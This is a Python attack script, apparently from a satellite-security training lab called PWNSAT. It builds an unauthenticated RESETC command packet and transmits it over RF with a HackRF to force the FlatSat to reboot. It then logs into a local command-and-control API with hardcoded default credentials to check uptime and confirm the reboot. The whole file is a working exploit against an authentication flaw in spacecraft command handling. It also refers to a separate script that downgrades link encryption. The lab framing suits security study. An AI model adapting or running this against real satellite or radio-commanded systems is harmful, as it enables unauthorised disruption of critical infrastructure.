#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 07_resetc_rf.py -- unauthenticated RESETC.
#
# Root cause: groundStationCommandAllowed() lets every APID through
# unauthenticated by default, and RESETC's handler (APID 0x02) only blinks
# an LED and calls softwareReset(). The simplest packet in the set (no
# payload at all).
#
# RESETC sends no TM before rebooting, so there's nothing to catch over RF;
# the only evidence is the reboot itself. --confirm-via-c3 (on by default)
# polls PWNSAT-C3's REST API for the FlatSat's uptime_s before and after TX
# -- uptime dropping back near zero proves the reboot. Pass
# --confirm-via-c3=off for pure fire-and-forget (e.g. if C3 isn't running).
#
# Usage:
#   ./07_resetc.py
#   ./07_resetc.py --encrypt=off   # link must be downgraded first (see 04)
#   ./07_resetc.py --gain 30 --seq 5

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from pwnsat_packets import build_command_packet  # noqa: E402

from require_gnuradio import check as _check_gnuradio  # noqa: E402
_check_gnuradio()

from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402

C3_BASE_URL = "http://127.0.0.1:8000"
C3_LOGIN = {"username": "pwnsat", "password": "pwnsat"}


def read_uptime_via_c3(timeout_s: float = 4.0):
    """Best-effort: logs into PWNSAT-C3's REST API, sends a 'status'
    command over its own (serial) link, and pulls uptime_s back out of the
    STATUS TM over the websocket. Returns None on any failure (C3 not
    running, not reachable, no reply in time, etc.) -- this is a
    convenience, never required for the attack itself."""
    try:
        import asyncio
        import json
        import requests
        import websockets
    except ImportError:
        return None

    async def _poll():
        s = requests.Session()
        r = s.post(f"{C3_BASE_URL}/api/login", json=C3_LOGIN, timeout=3)
        if r.status_code != 200:
            return None
        s.post(f"{C3_BASE_URL}/api/command", json={"command": "status"}, timeout=3)
        cookie_header = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())
        try:
            async with websockets.connect(f"{C3_BASE_URL.replace('http', 'ws')}/ws",
                                          additional_headers={"Cookie": cookie_header}) as ws:
                deadline = time.time() + timeout_s
                while time.time() < deadline:
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=deadline - time.time())
                    except asyncio.TimeoutError:
                        break
                    data = json.loads(msg)
                    if data.get("apid_name") == "STATUS":
                        return data.get("fields", {}).get("uptime_s")
        except Exception:
            return None
        return None

    try:
        return asyncio.run(_poll())
    except Exception:
        return None


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--device-args", default="hackrf", help="SoapySDR driver, e.g. 'hackrf'")
    parser.add_argument("--gain", type=int, default=20, help="HackRF TX (VGA) gain, dB")
    parser.add_argument("--frequency", type=int, default=UPLINK_FREQ_HZ, help="Hz")
    parser.add_argument("--confirm-via-c3", choices=["on", "off"], default="on",
                        help="poll PWNSAT-C3's REST API (must be running, serial link to "
                             "the FlatSat) for uptime_s before/after to auto-confirm the "
                             "reboot -- RESETC sends no TM of its own to catch over RF, "
                             "so this is the only automatic confirmation available "
                             "(default on; use off if C3 isn't running right now)")
    parser.add_argument("--quiet", action="store_true",
                        help="hide hackrf_transfer's own output (shown by default as "
                             "visible proof this is a real RF transmission, not just "
                             "this script's own print statements)")
    args = parser.parse_args()

    raw_spp = build_command_packet("reset", seq=args.seq, encrypt=(args.encrypt == "on"))

    print(f"[*] RESETC packet ({'encrypted' if args.encrypt == 'on' else 'cleartext'}, "
          f"seq={args.seq}): {raw_spp.hex()}")

    uptime_before = None
    if args.confirm_via_c3 == "on":
        print("[*] Checking PWNSAT-C3 for the FlatSat's current uptime (pre-attack baseline)...")
        uptime_before = read_uptime_via_c3()
        if uptime_before is None:
            print("    -> couldn't reach PWNSAT-C3 or get a STATUS reply in time -- "
                  "continuing without auto-confirmation (check manually after).")
        else:
            print(f"    -> uptime_s={uptime_before} before the attack.")

    print(f"[*] Transmitting on {args.frequency / 1e6:.3f} MHz via {args.device_args} "
          f"(gain={args.gain} dB)...")
    transmit_packet(raw_spp, frequency=args.frequency, device_args=args.device_args,
                    tx_gain=args.gain, verbose=not args.quiet)
    print("[+] Sent.")

    if uptime_before is None:
        print("\n[?] No automatic confirmation available -- check the FlatSat's serial "
              "console (red-then-yellow LED pattern, then USB CDC ports drop and "
              "re-enumerate) or PWNSAT-C3 (uptime resets to 0) by hand.")
        return

    print("[*] Waiting for the FlatSat to reboot and PWNSAT-C3 to reconnect...")
    time.sleep(6.0)  # watchdog_reboot + USB CDC re-enumeration + C3's own reconnect
    uptime_after = read_uptime_via_c3(timeout_s=6.0)

    print("\n" + "=" * 66)
    if uptime_after is None:
        print("[i] Packet sent -- the attack itself doesn't depend on this check. "
              "PWNSAT-C3 just hasn't reconnected to the FlatSat's new USB enumeration "
              "yet (expected: the reboot breaks the serial handle C3 already had open). "
              "Restart PWNSAT-C3 and read its uptime_s fresh to confirm the reboot -- "
              "it should be small (just booted) instead of continuing to climb.")
    elif uptime_after < uptime_before:
        print(f"[+] REBOOT CONFIRMED: uptime_s went {uptime_before} -> {uptime_after} "
              f"(dropped instead of continuing to climb) -- the FlatSat rebooted from a "
              f"single unauthenticated RESETC, no credentials of any kind involved.")
    else:
        print(f"[?] uptime_s went {uptime_before} -> {uptime_after} -- did NOT drop as "
              f"expected. Either the reboot hasn't finished yet (try again in a few "
              f"seconds) or the packet didn't land -- check the serial console directly.")
    print("=" * 66)


if __name__ == "__main__":
    main()
